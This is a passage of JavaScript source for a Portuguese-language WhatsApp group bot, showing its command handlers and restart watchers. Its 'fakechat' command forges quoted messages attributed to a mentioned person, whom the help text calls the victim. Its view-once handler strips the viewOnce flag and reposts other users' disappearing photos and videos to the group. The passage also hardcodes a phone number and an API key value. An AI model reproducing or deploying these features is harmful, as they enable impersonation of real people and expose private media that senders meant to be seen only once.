`)
break

case 'fakechat': case 'fakemsg':
if(!isGroup) return reply(`SO GRUPOS`);
var [repplace, tarrget, bott] = q.split("/")
var m_ = info.message.extendedTextMessage && info.message.extendedTextMessage.contextInfo && info.message.extendedTextMessage.contextInfo.mentionedJid ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : null
if (m_ && tarrget && bott) {
amy.sendMessage(from, {text: `${bott}`}, {quoted: {key: {fromMe: false, participant: `${m_}`}, message: {conversation: `${tarrget}`}}});
} else {
reply(`Crie mensagens fakes com qualquer uma pessoa! Explicando abaixo:\n‚Äî\n‚Ä¢ Voc√™ precisaria mencionar a pessoa e adicionar a mensagem que ele supostamente iria reply e que voc√™ responderia a seguinte mensagem, todos usando a */* para separar o que foi pedido dito nesse textinho...\n‚Ä¢ *Ex:* ${prefix+command} @vitima/msg1/msg2`);
}
break;

default:
if(isCmd) {
reagir(from,"üí¢")
}

if(budy.includes("gpt") || budy.includes("Gpt")) {

if(!q) return reagir(from, "‚ùî")

gpt = await fetchJson(`https://api.cariflex.xyz/api/ai/gpt?query=${q}`)

const gpts = require('./arquivos/funcoes/gtts')('pt')

ranm = getRandom('.mp3')

rano = getRandom('.ogg')

gpts.save(ranm, `${gpt.resposta}`, function() {

exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {

amy.sendMessage(from, {audio: fs.readFileSync(ranm), ptt:true, mimetype: "audio/mpeg"}, {quoted: info})

DLT_FL(ranm)
DLT_FL(rano)
})
})

}

if(budy.includes('@5596991542453') || (budy.includes('@559691542453'))){

await amy.sendMessage(from, {react: {text: `üòÅ`, key: info.key}})

reply("Meu dono logo ira responder voce ü•∞.")
}



if(isX9VisuUnica) {

if(info.message?.viewOnceMessageV2 || type == "viewOnceMessage") {

if(JSON.stringify(info).includes("videoMessage")) {

var px = info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage

px.viewOnce = false

px.video = {url: px.url}

px.caption +=`Revelando video de visualiza√ß√£o unica enviado por  [ ${pushname} ] üòà`

amy.sendMessage(from,px)

} else {

var px = info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage

px.viewOnce = false

px.image = {url: px.url}

px.caption += `Revelando imagem de visualiza√ß√£o unica enviada por  [ ${pushname}  ] üòà `

amy.sendMessage(from,px)

}}}

var budy2 = body.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");
        
const isBot = info.key.fromMe ? true : false

if(isAntiNotas && body.toString().match(/(üí≥|üå®Ô∏è|üí∏|üíµ|üí∑|üí∂|ü™ô|üí∞|ü§ë|‚öñÔ∏è)/gi) && isBotAdmins) {

if(type == 'stickerMessage') return
let verificar = body.toString().match(/(üí≥|üí∏|üíµ|üí∑|üí∂|ü™ô|üí∞|ü§ë|‚öñÔ∏è)/gi)

if (verificar && body.length < 100) return

if(isGroupAdmins) return amy.sendMessage(from, {text:'Nao irei remover pois e adm'}, {quoted: info})  

await amy.sendMessage(from, {text: `Ola ${pushname} Voc√™ enviou uma mensagem proibida entao irei removelo`}, {quoted: info}) 

setTimeout(async function () {
amy.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}          

if(budy.includes('prefixo') || (budy.includes('Prefixo'))){
reply(`${tempo} ${pushname} aqui esta o meu prefix„Äé ${prefix} „Äè`)
}

if(budy.includes('üîë')){
try {
await sleep(2000)
eu = await fetchJson(`https://api.cariflex.xyz/api/keyerrada?apikey=cariflex-key`)
reagir(from, "üÜô")
 amy.sendMessage(from, {text: `${eu.message}\n${eu.request}`}, {quoted: info})
} catch (error) {
reagir(from, "‚ùå")
}
}

}} catch (erro) {
console.log(erro)
}}) 

amy.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if(lastDisconnect === undefined) {

}

if(connection === 'close') {
var shouldReconnect = (lastDisconnect.error.Boom)?.output?.statusCode !== DisconnectReason.loggedOut  
ligarbot()
}})}
ligarbot()

fs.watchFile('./menus/alugar.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('O Menu foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./menus/menudono.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('O Menu foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./menus/menu.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('O Menu foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./start.sh', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('O start.sh foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./dono.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('A index foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./index.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('A index foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./config.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('A config foi editada, irei reiniciar...');
process.exit()
}
})